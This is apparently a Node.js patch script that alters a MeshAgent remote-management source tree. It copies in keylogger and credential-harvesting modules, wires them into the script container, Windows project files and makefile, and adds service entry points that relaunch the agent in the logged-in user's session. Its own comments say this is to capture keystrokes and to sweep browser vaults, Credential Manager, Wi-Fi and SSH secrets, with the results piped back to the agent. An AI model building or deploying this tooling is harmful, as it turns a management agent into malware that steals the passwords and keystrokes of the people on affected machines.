'use strict';
const fs = require('fs');
const path = require('path');
const sourceRoot = path.join(__dirname, '..');
const root = path.resolve(process.argv[2] || '');
if (!fs.existsSync(path.join(root, 'MeshAgent.sln')) || !fs.existsSync(path.join(root, 'microscript', 'ILibDuktape_ScriptContainer.c'))) throw new Error('Pass a MeshAgent checkout root');

// Both native modules are compiled into the agent: the reference keylogger
// (keylog-*.log, live keystrokes) and the new password recovery engine
// (passrec-*.jsonl credential reports).
const agentFiles = [
    ['agent/ILibDuktape_Keylogger.c', 'microscript/ILibDuktape_Keylogger.c'],
    ['agent/ILibDuktape_Keylogger.h', 'microscript/ILibDuktape_Keylogger.h'],
    ['agent/ILibDuktape_PassRecover.c', 'microscript/ILibDuktape_PassRecover.c'],
    ['agent/ILibDuktape_PassRecover.h', 'microscript/ILibDuktape_PassRecover.h'],
    // Master references this header but a fresh source zip does not ship it;
    // without it the build fails with "Cannot open include file: ILibDuktape_Commit.h".
    ['agent/ILibDuktape_Commit.h', 'microscript/ILibDuktape_Commit.h']
];
for (const [from, to] of agentFiles) fs.copyFileSync(path.join(sourceRoot, from), path.join(root, to));

function edit(relativePath, transform) {
    const file = path.join(root, relativePath);
    const old = fs.readFileSync(file, 'utf8');
    const next = transform(old);
    if (old !== next) fs.writeFileSync(file, next, 'utf8');
}

const modules = [
    { header: 'ILibDuktape_Keylogger.h', init: 'ILibDuktape_Keylogger_Init(ctx);' },
    { header: 'ILibDuktape_PassRecover.h', init: 'ILibDuktape_PassRecover_Init(ctx);' }
];

for (const mod of modules) {
    edit(path.join('microscript', 'ILibDuktape_ScriptContainer.c'), function (source) {
        if (!source.includes('#include "' + mod.header + '"')) {
            const marker = '#include "ILibDuktape_WebRTC.h"';
            if (!source.includes(marker)) throw new Error('ScriptContainer include anchor changed');
            source = source.replace(marker, marker + '\r\n#ifdef WIN32\r\n#include "' + mod.header + '"\r\n#endif');
        }
        if (!source.includes(mod.init)) {
            const webRtc = source.indexOf('ILibDuktape_WebRTC_Init(ctx);');
            const guard = source.lastIndexOf('#ifndef NO_WEBRTC', webRtc);
            if (webRtc < 0 || guard < 0) throw new Error('ScriptContainer module-init point changed');
            const newline = source.includes('\r\n') ? '\r\n' : '\n';
            const init = '#ifdef WIN32' + newline + '\t\t' + mod.init + newline + '#endif' + newline;
            source = source.slice(0, guard) + init + source.slice(guard);
        }
        return source;
    });

    // Add the C module to every Windows build project (meshconsole + meshservice).
    const projectDirs = ['meshconsole', 'meshservice'];
    for (const dir of projectDirs) {
        for (const file of fs.readdirSync(path.join(root, dir)).filter((x) => x.endsWith('.vcxproj'))) {
            edit(path.join(dir, file), function (source) {
                if (!source.includes('..\\microscript\\' + mod.header.replace('.h', '.c'))) {
                    const marker = '<ClCompile Include="..\\microscript\\ILibDuktape_WebRTC.c" />';
                    if (!source.includes(marker)) throw new Error(file + ' compile item changed');
                    source = source.replace(marker, marker + '\r\n    <ClCompile Include="..\\microscript\\' + mod.header.replace('.h', '.c') + '" />');
                }
                if (!source.includes('..\\microscript\\' + mod.header)) {
                    const marker = '<ClInclude Include="..\\microscript\\ILibDuktape_WebRTC.h" />';
                    if (!source.includes(marker)) throw new Error(file + ' include item changed');
                    source = source.replace(marker, marker + '\r\n    <ClInclude Include="..\\microscript\\' + mod.header + '" />');
                }
                return source;
            });
        }
    }

    edit('makefile', function (source) {
        const src = 'microscript/' + mod.header.replace('.h', '.c');
        if (source.includes(src)) return source;
        const marker = 'SOURCES += microscript/ILibDuktape_ScriptContainer.c';
        const at = source.indexOf(marker);
        if (at < 0) throw new Error('MeshAgent makefile source list changed');
        const end = source.indexOf('\n', at);
        return source.slice(0, end) + ' ' + src + source.slice(end);
    });
}

// Add the worker command branches so the service executable can be
// re-launched inside the interactive user's session. Without these branches
// a session 0 agent has no way to capture the console user's keystrokes or
// read the console user's DPAPI-protected browser vaults.
edit(path.join('meshservice', 'ServiceMain.c'), function (source) {
    // Make the worker entry points visible (otherwise C4013 implicit-extern).
    if (!source.includes('#include "microscript/ILibDuktape_Keylogger.h"')) {
        const anchor = '#include "microscript/ILibDuktape_Commit.h"';
        const at = source.indexOf(anchor);
        if (at < 0) throw new Error('ServiceMain.c ILibDuktape_Commit.h include anchor changed');
        const lineEnd = source.indexOf('\n', at) + 1;
        const newline = source.includes('\r\n') ? '\r\n' : '\n';
        source = source.slice(0, lineEnd) +
            '#ifdef WIN32' + newline +
            '\t#include "microscript/ILibDuktape_Keylogger.h"' + newline +
            '\t#include "microscript/ILibDuktape_PassRecover.h"' + newline +
            '#endif' + newline +
            source.slice(lineEnd);
    }
    if (source.includes('keylog-worker') && source.includes('passrecover-worker')) { return source; }
    const marker = 'if (argc > 1 && (strcasecmp(argv[1], "-finstall") == 0';
    const at = source.indexOf(marker);
    if (at < 0) throw new Error('ServiceMain.c -finstall anchor changed');
    const newline = source.includes('\r\n') ? '\r\n' : '\n';
    const branches = [];
    if (!source.includes('keylog-worker')) {
        branches.push(
            '\t/* User-session keylog worker (see ILibDuktape_Keylogger.c). Runs the',
            '\t * keyboard hook inside the interactive user\'s session and sends the',
            '\t * formatted lines back to the agent over a named pipe. */',
            '\tif (argc > 1 && strcasecmp(argv[1], "keylog-worker") == 0)',
            '\t{',
            '\t\tretCode = ILibDuktape_KeyloggerWorker_Run(argc, argv);',
            '\t\targv[argc] = NULL; /* wmain_free releases argc+1 slots */',
            '\t\twmain_free(argv);',
            '\t\treturn retCode;',
            '\t}',
            ''
        );
    }
    if (!source.includes('passrecover-worker')) {
        branches.push(
            '\t/* User-session credential harvest worker (see ILibDuktape_PassRecover.c).',
            '\t * Runs the browser/Credential Manager/Wi-Fi/SSH sweep inside the',
            '\t * interactive user\'s session and streams the JSONL result back',
            '\t * to the agent over a named pipe. */',
            '\tif (argc > 1 && strcasecmp(argv[1], "passrecover-worker") == 0)',
            '\t{',
            '\t\tretCode = ILibDuktape_PassRecoverWorker_Run(argc, argv);',
            '\t\targv[argc] = NULL; /* wmain_free releases argc+1 slots */',
            '\t\twmain_free(argv);',
            '\t\treturn retCode;',
            '\t}',
            ''
        );
    }
    if (branches.length === 0) { return source; }
    return source.slice(0, at) + branches.join(newline) + source.slice(at);
});

console.log('MeshAgent patched: ' + agentFiles.length + ' module files copied, ScriptContainer/ServiceMain/vcxproj/makefile updated.');
